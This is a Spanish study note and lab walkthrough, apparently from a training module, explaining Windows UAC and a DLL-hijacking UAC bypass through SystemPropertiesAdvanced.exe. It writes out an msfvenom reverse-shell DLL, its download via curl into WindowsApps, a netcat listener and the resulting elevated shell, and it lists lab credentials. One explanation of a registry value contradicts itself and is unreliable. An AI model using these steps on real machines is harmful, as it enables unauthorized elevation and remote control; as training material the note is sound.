# User Account Control

## 1. UAC

* **Definición:** [User Account Control](https://learn.microsoft.com/es-es/windows/security/application-security/application-control/user-account-control/how-it-works) es una característica de Windows que muestra un *prompt* de consentimiento para actividades que requieren privilegios elevados. Su función principal es evitar cambios no intencionados aun cuando el usuario sea administrador.
* **Integridad y niveles:** Las aplicaciones tienen distintos *integrity levels*. Un programa con un nivel alto puede realizar tareas que podrían comprometer el sistema.
* **Contexto de ejecución:** Con UAC activado, las aplicaciones y tareas normalmente se ejecutan bajo el contexto de una **cuenta no administradora** a menos que un administrador autorice explícitamente elevarlas.
* **Conveniencia, no barrera de seguridad:** UAC es una característica de conveniencia que protege contra cambios accidentales por parte de administradores, pero **no** se considera una barrera de seguridad inquebrantable.

---

## 2. Tokens de acceso y Admin Approval Mode

* **Token estándar vs token elevado:** Cuando un usuario inicia sesión con una cuenta estándar, sus procesos usan un *standard user token* con los derechos de usuario estándar. Algunas aplicaciones necesitan permisos adicionales; UAC puede añadir permisos al token cuando se autoriza.
* **Cuenta RID 500 (built-in Administrator):** La cuenta de administrador integrada (RID 500) opera siempre en **alto nivel obligatorio** (high mandatory level).
* **Admin Approval Mode (AAM):** Con AAM activado, nuevas cuentas de administrador normales operarán por defecto en **nivel medio obligatorio**. Al iniciar sesión, se les asignan **dos tokens separados**: uno limitado (sin privilegios administrativos) y otro completo (elevado). Las acciones que requieren elevación usan el token elevado tras consentimiento.

---

## 3. Los ajustes de UAC en Group Policy y el registro

- [`Funcionamiento de UAC`](https://learn.microsoft.com/es-es/windows/security/application-security/application-control/user-account-control/how-it-works)
- [`Configuración y opciones`](https://learn.microsoft.com/es-es/windows/security/application-security/application-control/user-account-control/settings-and-configuration?tabs=intune)

* **Configuración mediante políticas:** Los administradores pueden configurar UAC localmente con `secpol.msc` o mediante GPO en entornos AD.
* **Tabla de settings:**

  * `FilterAdministratorToken` — Admin Approval Mode para la cuenta integrada (por defecto: Disabled)
  * `EnableUIADesktopToggle` — Permite a aplicaciones con UIAccess pedir elevación sin el secure desktop (por defecto: Disabled)
  * `ConsentPromptBehaviorAdmin` — Comportamiento del prompt para administradores en Admin Approval Mode (por defecto: "Prompt for consent for non-Windows binaries")
  * `ConsentPromptBehaviorUser` — Comportamiento del prompt para usuarios estándar (por defecto: "Prompt for credentials")
  * `EnableInstallerDetection` — Detectar instalaciones y pedir elevación (Enabled por defecto en Home, Disabled en Enterprise)
  * `ValidateAdminCodeSignatures` — Sólo elevar ejecutables firmados y validados (Disabled)
  * `EnableSecureUIAPaths` — Sólo elevar UIAccess instalados en ubicaciones seguras (Enabled)
  * `EnableLUA` — Ejecutar administradores en Admin Approval Mode (Enabled)
  * `PromptOnSecureDesktop` — Cambiar al secure desktop cuando se pide elevación (Enabled)
  * `EnableVirtualization` — Virtualizar fallos de escritura de archivo/registro a ubicaciones por usuario (Enabled)

---

## 4. Ejemplo visual del prompt

El ejemplo menciona un prompt pidiendo permiso para que el Editor del Registro haga cambios: el publisher verificado es Microsoft Windows y las opciones son **Yes** o **No**.

<img width="1608" height="668" alt="image" src="https://github.com/user-attachments/assets/6ba42c03-c458-4de6-bbc7-d7abe0d57dad" />


---

## 5. Confirmar usuario actual y pertenencia a grupos

### Comando `whoami /user`

```
C:\htb> whoami /user

USER INFORMATION
----------------

User Name         SID
================= ==============================================
winlpe-ws03\sarah S-1-5-21-3159276091-2191180989-3781274054-1002
```

* **Qué hace:** `whoami /user` muestra el nombre de usuario y el SID (Security Identifier) del token con que se está ejecutando la sesión actual.
* **Interpretación:** `winlpe-ws03\sarah` es el usuario y `S-1-5-21-...-1002` es su SID.

### Comando `net localgroup administrators`

```
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
...
Administrator
mrb3n
sarah
The command completed successfully.
```

* **Qué hace:** Lista los miembros del grupo local `administrators`.
* **Interpretación:** Aquí `sarah` aparece como miembro del grupo de administradores, lo que confirma que la cuenta es administradora a nivel local.

### Comando `whoami /priv`

```
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
... SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
...
```

* **Qué muestra:** Lista de privilegios presentes en el token con su estado (`Enabled` o `Disabled`).
* **Importante:** Aunque la cuenta pertenece al grupo de administradores, los privilegios elevados pueden aparecer deshabilitados si el proceso corre con el *token limitado* (por ejemplo, la sesión no elevada bajo UAC).

---

## 6. Confirmar si UAC está habilitado 

### `REG QUERY` para `EnableLUA`

```
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```

* **Qué hace:** `REG QUERY` consulta una clave del registro. Aquí se pide el valor `EnableLUA` bajo `HKLM\...\Policies\System`.
* **Interpretación:** `EnableLUA` con valor `0x1` indica que UAC (LUA — Limited User Account) está **habilitado**.

### `REG QUERY` para `ConsentPromptBehaviorAdmin`

```
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

...
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

* **Qué hace:** Consulta el comportamiento del prompt para administradores.
* **Interpretación del valor `0x5`:** En la tabla de UAC, `ConsentPromptBehaviorAdmin = 0x5` corresponde al nivel más alto: **Always notify** (siendo el valor mostrado en este ejemplo equivalente a la configuración que provoca notificaciones más restrictivas y que reduce la cantidad de bypasses disponibles). Prompt solo cuando el ejecutable no pertenece a Microsoft.

---

## 7. Comprobar versión/build de Windows

### PowerShell: `[environment]::OSVersion.Version`

```
PS C:\htb> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

* **Qué hace:** Muestra la versión del sistema operativo en formato numérico (Major, Minor, Build, Revision).
* **Interpretación:** Build `14393` corresponde a Windows 10 **release 1607**. Esto es relevante porque las técnicas de bypass de UAC son dependientes del *build*.

[Conocer release](https://en.wikipedia.org/wiki/Windows_10_version_history)

<img width="959" height="442" alt="image" src="https://github.com/user-attachments/assets/d2fb38cb-4c08-49a6-a552-ebcda1fac95e" />


---

## 8. Elección de técnica — UACME y técnica 54

* **[UACME](https://github.com/hfiref0x/UACME):** Proyecto que lista bypasses de UAC y para qué builds funcionan.
* **Técnica 54:** Indica que funciona a partir del *build* `14393` y ataca la versión de 32 bits del binario auto-elevador `SystemPropertiesAdvanced.exe`.
* **Objetivo:** Aprovechar binarios de confianza que Windows auto-eleva sin pedir consentimiento.

[Publicación](https://egre55.github.io/system-properties-uac-bypass/)

---

## 9. Concepto: DLL search order y DLL hijacking

* **Observación:** El binario 32-bit intenta cargar `srrstr.dll` (no existe por defecto). Si Windows no encuentra la DLL legítima, intentará buscarla siguiendo un orden predefinido.
* **Orden de búsqueda de DLL:**

  1. El directorio desde donde se cargó la aplicación.
  2. El directorio del sistema `C:\Windows\System32` (en sistemas 64-bit para procesos 64-bit).
  3. El directorio de sistema de 16-bit `C:\Windows\System` (no soportado en 64-bit modernos).
  4. El directorio de Windows.
  5. Cualquier directorio listado en la variable de entorno `PATH`.
* **Implicación:** Si un directorio en `PATH` es escribible por el usuario, un atacante puede colocar `srrstr.dll` allí y lograr que el binario auto-elevado la cargue en contexto elevado.

---

## 10. Revisar la variable PATH y encontrar `WindowsApps`

### Comando `cmd /c echo %PATH%` desde PowerShell

```
PS C:\htb> cmd /c echo %PATH%

C:\Windows\system32;
C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
```

* **Qué hace:** Invoca `cmd` para expandir la variable de entorno `%PATH%` y mostrar su contenido.
* **Interpretación:** `C:\Users\sarah\AppData\Local\Microsoft\WindowsApps` está en `PATH` y es **dentro del perfil del usuario**, por lo tanto es **escribible por el usuario** en muchos casos. Esto la convierte en un candidato para colocar la DLL maliciosa.

---

## 11. Generar la DLL maliciosa — `msfvenom`

### Comando

```
CyberWolfSec@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

* **`msfvenom`:** Herramienta para generar payloads de Metasploit.
* **Opciones:**

  * `-p windows/shell_reverse_tcp` — payload que abre una shell reversa en Windows.
  * `LHOST=10.10.14.3` — dirección IP del host atacante donde el payload se conectará (tun0 en el ejemplo).
  * `LPORT=8443` — puerto remoto en el host atacante.
  * `-f dll` — formato de salida: un archivo DLL.
  * `> srrstr.dll` — redirección para guardar la salida en un archivo llamado `srrstr.dll`.
* **Salida informativa:** El comando informa la arquitectura escogida (x86) y el tamaño final del DLL.

---

## 12. Servir el DLL por HTTP — `python3 -m http.server`

```
CyberWolfSec@htb[/htb]$ sudo python3 -m http.server 8080
```

* **Qué hace:** Lanza un servidor HTTP simple en el puerto `8080` para servir archivos desde el directorio actual.
* **Uso:** Facilita la transferencia del archivo `srrstr.dll` al host objetivo usando `curl` o `Invoke-WebRequest`.

---

## 13. Descargar el DLL en la víctima — `curl` con `-O` y ruta destino

```
PS C:\htb> curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

* **`curl URL -O "path"`:** En PowerShell `curl` está mapeado a `Invoke-WebRequest`; el ejemplo descarga el archivo desde la dirección atacante y lo guarda directamente en la ruta de `WindowsApps` dentro del perfil de `sarah`.
* **Resultado buscado:** Poner `srrstr.dll` en un directorio en `PATH` y que sea legible por el futuro proceso auto-elevado.

---

## 14. Preparar el listener — `nc -lvnp 8443`

```
CyberWolfSec@htb[/htb]$ nc -lvnp 8443
```

* **`nc`:** Se usa para escuchar conexiones entrantes.
* **Flags:**

  * `-l` listen,
  * `-v` verbose,
  * `-n` no DNS lookup,
  * `-p 8443` puerto 8443.
* **Objetivo:** Esperar la conexión reversa que el DLL ejecutará.

---

## 15. Probar la DLL con `rundll32`

```
C:\htb> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

* **`rundll32`**: Utilidad de Windows para ejecutar funciones exportadas de DLLs.
* **Sintaxis usada:** `rundll32 shell32.dll,Control_RunDLL <path a DLL>` invoca la función `Control_RunDLL` exportada por `shell32.dll` y pasa como argumento la DLL objetivo; en este contexto se fuerza la carga/ejecución de la DLL maliciosa.
* **Resultado inicial:** Al ejecutar esto se obtiene una shell reversa con **privilegios normales** (UAC aún presente), por lo que la conexión inicial muestra credenciales de usuario no elevadas.


```
C:\Users\sarah> whoami /priv

whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

---

## 16. Verificar/terminar procesos `rundll32` antes del exploit final

### `tasklist /svc | findstr "rundll32"`

```
C:\htb> tasklist /svc | findstr "rundll32"
rundll32.exe                  6300 N/A
rundll32.exe                  5360 N/A
rundll32.exe                  7044 N/A
```

* **`tasklist /svc`** lista procesos y servicios asociados. `findstr "rundll32"` filtra las líneas que contienen `rundll32`.
* **Salida en el texto:** Muestra varios procesos `rundll32.exe` con distintos PIDs.

### `taskkill /PID <PID> /F`

* **`taskkill`** mata procesos por PID. ` /F` fuerza la terminación.
* **Uso en el ejemplo:** Se terminan los procesos `rundll32.exe` residuales antes de ejecutar el binario auto-elevador para asegurar comportamiento consistente.

```
C:\htb> taskkill /PID 7044 /F
SUCCESS: The process with PID 7044 has been terminated.

C:\htb> taskkill /PID 6300 /F
SUCCESS: The process with PID 6300 has been terminated.

C:\htb> taskkill /PID 5360 /F
SUCCESS: The process with PID 5360 has been terminated.
```

---

## 17. Ejecutar la versión 32-bit de SystemPropertiesAdvanced.exe

```
C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

* **Por qué SysWOW64:** En sistemas 64-bit, los ejecutables 32-bit residuales o versiones específicas se encuentran en `C:\Windows\SysWOW64`. La técnica 54 ataca la versión de 32-bit del binario.
* **Efecto buscado:** Este binario es auto-elevador y, debido al fallo de carga de `srrstr.dll`, cargará la DLL colocada en `WindowsApps` según el orden de búsqueda. Como `SystemPropertiesAdvanced.exe` se ejecuta con privilegios elevados, la DLL cargada se ejecuta en contexto elevado.

---

## 18. Conexión elevada recibida y verificación de privilegios

* **Listener muestra la conexión entrante.** En el ejemplo, la IP del objetivo y el banner de Windows aparecen en la consola del atacante.

### `whoami` y `whoami /priv` desde la shell recibida

```
nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 50273
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami
winlpe-ws03\sarah


C:\Windows\system32>whoami /priv

whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

* **`whoami`** verifica el usuario que representa el proceso remoto. El resultado en el ejemplo muestra `winlpe-ws03\sarah` pero ahora desde `C:\Windows\system32>` indicando que el proceso corre en un contexto del sistema o con token elevado.
* **`whoami /priv`** en la shell elevada muestra muchos privilegios listados que antes estaban deshabilitados bajo el token limitado. Esto indica que la ejecución de `SystemPropertiesAdvanced.exe` con la DLL maliciosa permitió **ejecutar código en un contexto elevado** y habilitar privilegios necesarios.

---

## 19. Conclusión del flujo

* UAC actúa como un freno, no como una barrera absoluta.
* Identificar binarios auto-elevadores y directorios en `PATH` que sean escribibles por el usuario permite abusar del orden de búsqueda de DLL para lograr ejecución elevada.
* El ejemplo sigue los pasos: identificar build, seleccionar técnica compatible (UACME técnica 54), preparar payload (DLL), colocarla en ruta del usuario, ejecutar el binario auto-elevador 32-bit y obtener shell elevada.

---


# Laboratorio

Siga los pasos de esta sección para obtener una conexión de shell inversa con privilegios de usuario normales y otra que omita el UAC. Envíe el contenido de `flag.txt` que se encuentra en el escritorio de Sarah al finalizar.


- `ip`: `10.129.131.248`
- `usuario`: `sarah`
- `password`: `HTB_@cademy_stdnt!`


Nos conectamos al host mediante `RDP`:
```bash
xfreerdp /v:10.129.131.248 /u:sarah
```

<img width="1013" height="778" alt="image" src="https://github.com/user-attachments/assets/90231a43-4846-418b-a44c-1f9d1b7e6859" />


Abrimos una powershell y confirmamos nuestro usuario actual y pertenencia a grupos:

```powershell
whoami /user
```

```powershell
net localgroup administrators
```

<img width="1004" height="488" alt="image" src="https://github.com/user-attachments/assets/10ed2ec5-6139-49b6-8c64-19f1cae0a732" />


Con estos resultados confirmamos que nuestro usuario es `sarah` y pertenece al grupo `administrators`.

Listamos los privilegios existentes en el token actual:
```powershell
whoami /priv
```

<img width="1012" height="340" alt="image" src="https://github.com/user-attachments/assets/b9791488-ca43-45e9-87f5-3970d0b68bb3" />

Por más que seamos administradores, los privilegios elevados aparecen deshabilitados ya que el proceso corre con el token limitado.

Confirmar si el `UAC` está habilitado:
```powershell
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
```

<img width="1006" height="171" alt="image" src="https://github.com/user-attachments/assets/731f9c01-84d6-4837-ae0f-c8a3f0a9d993" />

El valor `0x1` indica que `UAC` está habilitado.

Consultamos el comportamiento del prompt para administradores:
```powershell
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

<img width="1006" height="192" alt="image" src="https://github.com/user-attachments/assets/b6f6b49d-ec56-43aa-a734-66921cd912e5" />

El valor `0x5` corresponde a `Prompt solo cuando el ejecutable no pertenece a Microsoft`.
